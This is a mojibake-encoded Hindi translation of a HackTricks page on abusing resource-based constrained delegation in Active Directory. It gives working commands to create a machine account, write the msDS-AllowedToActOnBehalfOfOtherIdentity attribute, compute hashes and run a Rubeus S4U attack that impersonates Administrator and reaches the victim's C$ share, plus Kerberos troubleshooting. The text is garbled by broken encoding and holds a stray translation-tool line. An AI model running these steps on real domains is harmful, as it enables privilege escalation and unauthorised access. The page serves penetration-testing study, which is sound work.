# рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕рдВрдпрдорд┐рдд рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рддрд░рдХреАрдмреЗрдВ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

## рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕рдВрдпрдорд┐рдд рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХреА рдореВрд▓ рдмрд╛рддреЗрдВ

рдпрд╣ [рд╕рдВрдпрдорд┐рдд рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡](constrained-delegation.md) рдХреЗ рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди **рдЗрд╕рдХреЗ рдмрдЬрд╛рдп** рдХрд┐рд╕реА **рдСрдмреНрдЬреЗрдХреНрдЯ** рдХреЛ рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдХреЗ рдЦрд┐рд▓рд╛рдл **рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкреНрд░рддрд┐рд░реВрдкрдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рдмрдЬрд╛рдп**. рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕рдВрдпрдорд┐рдд рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ **рдЙрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЗрд╕рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкреНрд░рддрд┐рд░реВрдкрдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ**.

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╕рдВрдпрдорд┐рдд рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ рдирд╛рдордХ рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реЛрдЧреА рдЬрд┐рд╕рдореЗрдВ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдирд╛рдо рд╣реЛрдЧрд╛ рдЬреЛ рдЗрд╕рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкреНрд░рддрд┐рд░реВрдкрдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ.

рдЗрд╕ рд╕рдВрдпрдорд┐рдд рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдФрд░ рдЕрдиреНрдп рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡реЛрдВ рдореЗрдВ рдПрдХ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЕрдВрддрд░ рдпрд╣ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдЬреЛ **рдорд╢реАрди рдЦрд╛рддреЗ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдВ** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/рдЖрджрд┐_) рд╣реИ, рд╡рд╣ _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдЕрдиреНрдп рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рд░реВрдкреЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рдбреЛрдореЗрди рдПрдбрдорд┐рди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА).

### рдирдИ рдЕрд╡рдзрд╛рд░рдгрд╛рдПрдБ

рд╕рдВрдпрдорд┐рдд рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдореЗрдВ рдпрд╣ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ рдХрд┐ **`TrustedToAuthForDelegation`** рдзреНрд╡рдЬ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ _userAccountControl_ рдорд╛рди рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рддрд╛рдХрд┐ **S4U2Self** рдХрд╛ рдкреНрд░рджрд░реНрд╢рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ. рд▓реЗрдХрд┐рди рдпрд╣ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕рдЪ рдирд╣реАрдВ рд╣реИ.\
рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЙрд╕ рдорд╛рди рдХреЗ рдмрд┐рдирд╛ рднреА, рдЖрдк рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЦрд┐рд▓рд╛рдл **S4U2Self** рдХрд╛ рдкреНрд░рджрд░реНрд╢рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рдЖрдк рдПрдХ **рд╕реЗрд╡рд╛** рд╣реИрдВ (рдПрдХ SPN рд╣реИ) рд▓реЗрдХрд┐рди, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **`TrustedToAuthForDelegation`** рд╣реИ рддреЛ рд╡рд╛рдкрд╕реА TGS **Forwardable** рд╣реЛрдЧрд╛ рдФрд░ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╡рд╣ рдзреНрд╡рдЬ **рдирд╣реАрдВ рд╣реИ** рддреЛ рд╡рд╛рдкрд╕реА TGS **Forwardable рдирд╣реАрдВ** рд╣реЛрдЧрд╛.

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ **TGS** рдЬреЛ **S4U2Proxy** рдореЗрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ **Forwardable рдирд╣реАрдВ рд╣реИ**, рддреЛ **рдмреЗрд╕рд┐рдХ рд╕рдВрдпрдорд┐рдд рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ **рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧреА**. рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк **рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕рдВрдпрдорд┐рдд рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдХрд╛рдо рдХрд░реЗрдЧрд╛** (рдпрд╣ рдПрдХ рднреЗрджреНрдпрддрд╛ рдирд╣реАрдВ рд╣реИ, рдпрд╣ рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реИ, рдЬрд╛рд╣рд┐рд░рд╛ рддреМрд░ рдкрд░).

### рд╣рдорд▓реЗ рдХреА рд╕рдВрд░рдЪрдирд╛

> рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдХрдВрдкреНрдпреВрдЯрд░** рдЦрд╛рддреЗ рдкрд░ **рд▓рд┐рдЦрдиреЗ рдХреЗ рд╕рдордХрдХреНрд╖ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рд╣реИрдВ рддреЛ рдЖрдк рдЙрд╕ рдорд╢реАрди рдореЗрдВ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдкрд╣реБрдВрдЪ** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **рдкреАрдбрд╝рд┐рдд рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреЗ рд╕рдордХрдХреНрд╖ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИрдВ**ред

1. рд╣рдорд▓рд╛рд╡рд░ **рдПрдХ рдЦрд╛рддреЗ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рддрд╛ рд╣реИ** рдЬрд┐рд╕рдореЗрдВ рдПрдХ **SPN** рд╣реИ рдпрд╛ **рдПрдХ рдмрдирд╛рддрд╛ рд╣реИ** (тАЬрд╕реЗрд╡рд╛ AтАЭ). рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХреЛрдИ рднреА** _рдПрдбрдорд┐рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛_ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рд╡рд┐рд╢реЗрд╖ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ 10 **рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ (**_**MachineAccountQuota**_**) рддрдХ **рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ рдЙрдиреНрд╣реЗрдВ рдПрдХ **SPN** рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдмрд╕ рдПрдХ рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ SPN рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
2. рд╣рдорд▓рд╛рд╡рд░ **рдкреАрдбрд╝рд┐рдд рдХрдВрдкреНрдпреВрдЯрд░ (рд╕реЗрд╡рд╛ B) рдкрд░ рдЕрдкрдиреЗ WRITE рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ** рддрд╛рдХрд┐ **рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕рдВрдпрдорд┐рдд рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХреЗ рдЬреЛ рд╕реЗрд╡рд╛ A рдХреЛ рдкреАрдбрд╝рд┐рдд рдХрдВрдкреНрдпреВрдЯрд░ (рд╕реЗрд╡рд╛ B) рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкреНрд░рддрд┐рд░реВрдкрдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**ред
3. рд╣рдорд▓рд╛рд╡рд░ Rubeus рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛ B рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдХреЗ рд╕рд╛рде рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдкрд╣реБрдВрдЪ рдХреЗ рд╕рд╛рде** рд╕реЗрд╡рд╛ A рд╕реЗ рд╕реЗрд╡рд╛ B рдХреЗ рд▓рд┐рдП **рдкреВрд░реНрдг S4U рд╣рдорд▓рд╛** (S4U2Self рдФрд░ S4U2Proxy) рдХрд░рддрд╛ рд╣реИред
   1. S4U2Self (рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП/рдмрдирд╛рдП рдЧрдП рдЦрд╛рддреЗ рд╕реЗ): **рдореЗрд░реЗ рд▓рд┐рдП рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХрд╛ TGS рдорд╛рдВрдЧреЗрдВ** (Forwardable рдирд╣реАрдВ)ред
   2. S4U2Proxy: рдкрд╣рд▓реЗ рдХреЗ рдЪрд░рдг рдореЗрдВ **Forwardable рдирд╣реАрдВ TGS** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдкреАрдбрд╝рд┐рдд рдореЗрдЬрдмрд╛рди** рдХреЗ рд▓рд┐рдП **рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕реЗ TGS рдорд╛рдВрдЧреЗрдВ**ред
   3. рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдпрджрд┐ рдЖрдк Forwardable рдирд╣реАрдВ TGS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕рдВрдпрдорд┐рдд рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдпрд╣ рдХрд╛рдо рдХрд░реЗрдЧрд╛ред
4. рд╣рдорд▓рд╛рд╡рд░ **рдЯрд┐рдХрдЯ рдкрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ **рдкреАрдбрд╝рд┐рдд рд╕реЗрд╡рд╛ B рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкреНрд░рддрд┐рд░реВрдкрдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

рдбреЛрдореЗрди рдХреЗ _**MachineAccountQuota**_ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## рд╣рдорд▓рд╛

### рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдирд╛

рдЖрдк [powermad](https://github.com/Kevin-Robertson/Powermad) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЛрдореЗрди рдХреЗ рдЕрдВрджрд░ рдПрдХ рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**:**
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Since there is no text provided outside of the image reference, there is nothing to translate. If you have specific text you would like translated, please provide it.
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### рд░рд┐рд╕реЛрд░реНрд╕-рдЖрдзрд╛рд░рд┐рдд рдХрдВрд╕реНрдЯреНрд░реЗрдиреНрдб рдбреЗрд▓рд┐рдЧреЗрд╢рди рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛

**activedirectory PowerShell рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
```markdown
![](../../.gitbook/assets/B2.png)

**рдкрд╛рд╡рд░рд╡реНрдпреВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛**
```
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### рдкреВрд░реНрдг S4U рд╣рдорд▓рд╛ рдХрд░рдирд╛

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдордиреЗ рдирдпрд╛ Computer object рдкрд╛рд╕рд╡рд░реНрдб `123456` рдХреЗ рд╕рд╛рде рдмрдирд╛рдпрд╛, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдЙрд╕ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╣реИрд╢ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
рдпрд╣ рдЙрд╕ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП RC4 рдФрд░ AES рд╣реИрд╢реЗрдЬрд╝ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдЧрд╛ред
рдЕрдм, рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
рдЖрдк Rubeus рдХреЗ `/altservice` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдмрд╛рд░ рдореЗрдВ рдЕрдзрд┐рдХ рдЯрд┐рдХрдЯ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдореЗрдВ "**Cannot be delegated**" рдирд╛рдордХ рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реЛрддреА рд╣реИред рдпрджрд┐ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдпрд╣ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╕рддреНрдп рдХреЗ рд░реВрдк рдореЗрдВ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕рдХреА рдирдХрд▓ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗред рдЗрд╕ рд╕рдВрдкрддреНрддрд┐ рдХреЛ bloodhound рдХреЗ рдЕрдВрджрд░ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

![](../../.gitbook/assets/B3.png)

### рдкрд╣реБрдБрдЪ

рдЕрдВрддрд┐рдо рдХрдорд╛рдВрдб рд▓рд╛рдЗрди **рдкреВрд░реНрдг S4U рд╣рдорд▓реЗ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░реЗрдЧреА рдФрд░ TGS рдХреЛ Administrator рд╕реЗ рдкреАрдбрд╝рд┐рдд рд╣реЛрд╕реНрдЯ рдореЗрдВ **рдореЗрдореЛрд░реА** рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдЧреАред\
рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ Administrator рд╕реЗ **CIFS** рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдПрдХ TGS рдХреА рдорд╛рдВрдЧ рдХреА рдЧрдИ рдереА, рдЗрд╕рд▓рд┐рдП рдЖрдк **C$** рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХреЗрдВрдЧреЗ:
```bash
ls \\victim.domain.local\C$
```
### рд╡рд┐рднрд┐рдиреНрди рд╕реЗрд╡рд╛ рдЯрд┐рдХрдЯреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

[**рдЙрдкрд▓рдмреНрдз рд╕реЗрд╡рд╛ рдЯрд┐рдХрдЯреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдпрд╣рд╛рдБ рдЬрд╛рдиреЗрдВ**](silver-ticket.md#available-services)ред

## Kerberos рддреНрд░реБрдЯрд┐рдпрд╛рдБ

* **`KDC_ERR_ETYPE_NOTSUPP`**: рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ kerberos DES рдпрд╛ RC4 рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЖрдк рдХреЗрд╡рд▓ RC4 рд╣реИрд╢ рдкреНрд░рджрд╛рди рдХрд░ рд░рд╣реЗ рд╣реИрдВред Rubeus рдХреЛ рдХрдо рд╕реЗ рдХрдо AES256 рд╣реИрд╢ рдкреНрд░рджрд╛рди рдХрд░реЗрдВ (рдпрд╛ рдХреЗрд╡рд▓ rc4, aes128 рдФрд░ aes256 рд╣реИрд╢ рдкреНрд░рджрд╛рди рдХрд░реЗрдВ)ред рдЙрджрд╛рд╣рд░рдг: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╡рд░реНрддрдорд╛рди рдХрдВрдкреНрдпреВрдЯрд░ рдХрд╛ рд╕рдордп DC рдХреЗ рд╕рдордп рд╕реЗ рдЕрд▓рдЧ рд╣реИ рдФрд░ kerberos рдареАрдХ рд╕реЗ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИред
* **`preauth_failed`**: рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рджрд┐рдпрд╛ рдЧрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо + рд╣реИрд╢реЗрдЬрд╝ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реЗ рд╣реИрдВред рдЖрдкрдиреЗ рд╣реИрд╢реЗрдЬрд╝ рдЬреЗрдирд░реЗрдЯ рдХрд░рддреЗ рд╕рдордп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдореЗрдВ "$" рдбрд╛рд▓рдирд╛ рднреВрд▓ рдЧрдП рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:
  * рдЖрдк рдЬрд┐рд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЗрдореНрдкрд░реНрд╕рдиреЗрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рд╡рд╣ рд╡рд╛рдВрдЫрд┐рдд рд╕реЗрд╡рд╛ рддрдХ рдкрд╣реБрдБрдЪ рдирд╣реАрдВ рд╕рдХрддрд╛ (рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдЙрд╕реЗ рдЗрдореНрдкрд░реНрд╕рдиреЗрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЙрд╕рдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд╣реИрдВ)
  * рдкреВрдЫреА рдЧрдИ рд╕реЗрд╡рд╛ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ (рдпрджрд┐ рдЖрдк winrm рдХреЗ рд▓рд┐рдП рдПрдХ рдЯрд┐рдХрдЯ рдорд╛рдВрдЧрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди winrm рдЪрд▓ рдирд╣реАрдВ рд░рд╣рд╛ рд╣реИ)
  * рдмрдирд╛рдпрд╛ рдЧрдпрд╛ fakecomputer рдЕрдкрдиреЗ рдЕрдзрд┐рдХрд╛рд░ рдЦреЛ рдЪреБрдХрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдЙрд╕реЗ рд╡рд╛рдкрд╕ рджреЗрдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
